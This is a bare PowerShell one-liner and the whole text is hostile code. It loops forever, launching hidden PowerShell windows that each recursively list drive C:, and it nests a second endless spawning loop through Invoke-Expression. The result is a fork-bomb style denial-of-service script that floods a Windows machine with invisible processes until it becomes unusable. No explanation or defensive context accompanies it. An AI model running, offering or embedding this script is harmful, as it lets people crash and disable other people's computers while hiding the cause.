while($true) { Start-Process powershell.exe -WindowStyle hidden -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:";    Invoke-Expression -Command 'while($true) {Start-Process powershell.exe -WindowStyle hidden -ArgumentList "-NoExit", "Get-ChildItem -Recurse C:"}'; }
